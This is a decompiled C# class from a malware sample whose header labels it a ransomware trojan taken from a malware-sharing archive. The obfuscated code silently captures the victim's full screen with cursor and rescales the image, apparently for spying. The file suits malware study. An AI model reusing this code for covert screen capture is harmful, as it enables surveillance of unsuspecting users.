// Decompiled with JetBrains decompiler
// Type:  
// Assembly: RingBell, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 126B6CA2-9E8E-4E8F-B66A-E8ED3E4C478A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.MSIL.Foreign.gen-8b786784c172c6f8b241b1286a2054294e8dc2c167d9b4daae0e310a1d923ba0.exe

using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Windows.Forms;

internal sealed class \u0002\u2001
{
  [DllImport("user32.dll", EntryPoint = "DrawIcon")]
  private static extern bool \u0002(IntPtr _param0, int _param1, int _param2, IntPtr _param3);

  [DllImport("user32.dll", EntryPoint = "GetCursorInfo")]
  private static extern bool \u0002(out \u0002\u2001.\u0002 _param0);

  public Bitmap \u0002(int _param1)
  {
    \u0002\u2001.\u0002 obj = new \u0002\u2001.\u0002();
    Bitmap original = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format24bppRgb);
    Bitmap bitmap;
    try
    {
      using (Graphics graphics = Graphics.FromImage((Image) original))
      {
        Rectangle bounds = Screen.PrimaryScreen.Bounds;
        graphics.CopyFromScreen(0, 0, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
        obj.\u0002 = Marshal.SizeOf(typeof (\u0002\u2001.\u0002));
        if (\u0002\u2001.\u0002(out obj))
        {
          if (obj.\u0003 == 1)
          {
            \u0002\u2001.\u0002(graphics.GetHdc(), obj.\u0008.\u0002, obj.\u0008.\u0003, obj.\u0005);
            graphics.ReleaseHdc();
          }
        }
      }
    }
    catch
    {
      bitmap = (Bitmap) null;
      goto label_10;
    }
    int height = original.Height * (_param1 * 100 / original.Height) / 100;
    int width = _param1 + _param1 * 100 / original.Width * _param1 / 100 + 100;
    bitmap = new Bitmap((Image) original, new Size(width, height));
label_10:
    return bitmap;
  }

  private struct \u0002
  {
    public int \u0002;
    public int \u0003;
    public IntPtr \u0005;
    public \u0002\u2001.\u0003 \u0008;
  }

  private struct \u0003
  {
    public int \u0002;
    public int \u0003;
  }
}
